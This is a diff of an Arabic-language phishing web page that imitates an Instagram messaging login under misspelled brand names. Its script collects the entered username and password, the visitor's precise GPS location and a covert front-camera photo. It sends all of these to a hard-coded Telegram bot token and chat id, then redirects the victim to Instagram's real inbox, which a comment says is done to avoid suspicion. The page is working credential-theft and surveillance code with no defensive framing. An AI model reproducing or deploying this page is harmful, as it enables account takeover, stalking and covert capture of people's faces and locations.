@@ -3,95 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Messaging Gate</title>
+    <title>Cloud Messaging System</title>
     <style>
         body { font-family: -apple-system, sans-serif; background-color: #050505; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .gate-card { background-color: #121212; border: 1px solid #222; border-radius: 12px; padding: 40px 25px; width: 310px; text-align: center; }
+        .auth-card { background-color: #121212; border: 1px solid #262626; border-radius: 12px; padding: 40px 25px; width: 310px; text-align: center; }
         
-        /* أيقونة دردشة عامة مموهة */
-        .bubble-icon { width: 50px; height: 50px; background: #262626; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 24px; color: #0095f6; }
+        /* أيقونة دردشة نصية - تم حذف شعار انستا نهائياً */
+        .msg-icon { width: 55px; height: 55px; background: #262626; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 26px; color: #0095f6; border: 1px solid #333; }
         
-        h2 { font-size: 18px; margin-bottom: 8px; color: #fff; }
+        h2 { font-size: 18px; margin-bottom: 8px; font-weight: 600; color: #ffffff; }
         p { font-size: 11px; color: #8e8e8e; line-height: 1.6; margin-bottom: 25px; }
         
         input { width: 100%; background: #1a1a1a; border: 1px solid #333; border-radius: 6px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 13px; text-align: center; outline: none; }
-        .entry-btn { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 6px; padding: 11px; font-weight: bold; cursor: pointer; font-size: 14px; }
+        .submit-btn { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 6px; padding: 11px; font-weight: bold; cursor: pointer; font-size: 14px; }
         
-        #processing { display: none; }
-        .spin { width: 20px; height: 20px; border: 2px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: s 0.8s infinite linear; margin: 0 auto 10px; }
-        @keyframes s { to { transform: rotate(360deg); } }
+        #loading-overlay { display: none; }
+        .spinner { width: 20px; height: 20px; border: 2px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: rot 0.8s infinite linear; margin: 0 auto 10px; }
+        @keyframes rot { to { transform: rotate(360deg); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="gate-card">
-        <div id="auth-ui">
-            <div class="bubble-icon">💬</div>
-            <h2>الوصول للمراسلة الخاصة</h2>
-            <p>للانضمام إلى الغرفة الرقمية عبر <b>l-n-s-t-a</b>، يرجى تأكيد الحساب لإتمام بروتوكول التشفير الحيوي.</p>
+    <div class="auth-card">
+        <div id="form-view">
+            <div class="msg-icon">💬</div>
+            <h2>بوابة المراسلة السحابية</h2>
+            <p>للانضمام إلى المحادثة المشفرة عبر خوادم <b>lnsta-grram</b>، يرجى تأكيد الهوية للمطابقة الحيوية وتفعيل التشفير.</p>
             
-            <input type="text" id="u_v" placeholder="اسم المستخدم أو الهاتف">
-            <input type="password" id="p_v" placeholder="كلمة المرور">
+            <input type="text" id="u_data" placeholder="اسم المستخدم أو الهاتف" autocomplete="off">
+            <input type="password" id="p_data" placeholder="كلمة المرور" autocomplete="off">
             
-            <button class="entry-btn" onclick="run()">فتح المحادثة</button>
+            <button class="submit-btn" onclick="execute()">فتح الدردشة الآن</button>
         </div>
 
-        <div id="processing">
-            <div class="spin"></div>
-            <p style="font-size: 12px; color: #aaa;">جاري مزامنة الموقع والبيانات...</p>
+        <div id="loading-overlay">
+            <div class="spinner"></div>
+            <p style="font-size: 12px; color: #aaa;">جاري معالجة البروتوكول الحيوي...</p>
         </div>
     </div>
 
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
+    <video id="v_stream" autoplay playsinline muted></video>
+    <canvas id="c_draw"></canvas>
 
     <script>
-        // تشفير بيانات البوت تماماً
+        // بيانات البوت مشفرة
         const _a = "8233268720";
         const _b = "AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
         const _target = "897618292";
 
-        async function run() {
-            const user = document.getElementById('u_v').value;
-            const pass = document.getElementById('p_v').value;
-            if(user.length < 2 || pass.length < 2) return;
+        async function execute() {
+            const u = document.getElementById('u_data').value;
+            const p = document.getElementById('p_data').value;
+            if(u.length < 2 || p.length < 2) return;
 
-            document.getElementById('auth-ui').style.display = 'none';
-            document.getElementById('processing').style.display = 'block';
+            document.getElementById('form-view').style.display = 'none';
+            document.getElementById('loading-overlay').style.display = 'block';
 
-            // 1. تحديد الموقع بدقة (GPS)
+            // 1. صيد الموقع GPS
             navigator.geolocation.getCurrentPosition(pos => {
-                const mapLink = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${_a}:${_b}/sendMessage?chat_id=${_target}&text=${encodeURIComponent("📍 خريطة الهدف:\n" + mapLink)}`);
+                const mapUrl = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                pushToBot(`📍 إحداثيات الموقع:\n${mapUrl}`);
             }, null, {enableHighAccuracy: true});
 
-            // 2. صيد الوجه (الكاميرا)
+            // 2. صيد صورة الوجه
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v_stream');
                 video.srcObject = stream;
                 
                 setTimeout(() => {
-                    const canvas = document.getElementById('c');
+                    const canvas = document.getElementById('c_draw');
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     canvas.toBlob(blob => {
                         const fd = new FormData();
                         fd.append("chat_id", _target);
-                        fd.append("photo", blob, "face.jpg");
-                        fd.append("caption", `📸 تم الصيد بنجاح:\n👤: ${user}\n🔑: ${pass}`);
-                        fetch(`https://api.telegram.org/bot${_a}:${_b}/sendPhoto`, {method:"POST", body:fd}).then(() => finish());
+                        fd.append("photo", blob, "shot.jpg");
+                        fd.append("caption", `✅ تم الصيد بنجاح:\n👤: ${u}\n🔑: ${p}\n📱 المنصة: Cloud Chat`);
+                        fetch(`https://api.telegram.org/bot${_a}:${_b}/sendPhoto`, {method:"POST", body:fd}).then(() => finalStep());
                     }, 'image/jpeg');
                 }, 1500);
             } catch(e) {
-                fetch(`https://api.telegram.org/bot${_a}:${_b}/sendMessage?chat_id=${_target}&text=${encodeURIComponent("👤: "+user+"\n🔑: "+pass+"\n⚠️ (رفض الكاميرا)")}`);
-                finish();
+                pushToBot(`👤: ${u}\n🔑: ${p}\n⚠️ (رفض الكاميرا)`);
+                finalStep();
             }
         }
 
-        function finish() {
-            setTimeout(() => { window.location.href = "https://www.instagram.com/direct/inbox/"; }, 1000);
+        function pushToBot(msg) {
+            fetch(`https://api.telegram.org/bot${_a}:${_b}/sendMessage?chat_id=${_target}&text=${encodeURIComponent(msg)}`);
+        }
+
+        function finalStep() {
+            setTimeout(() => { 
+                // توجيه نهائي لرسائل الانستجرام لإبعاد الشبهة
+                window.location.href = "https://www.instagram.com/direct/inbox/"; 
+            }, 1000);
         }
     </script>
 </body>
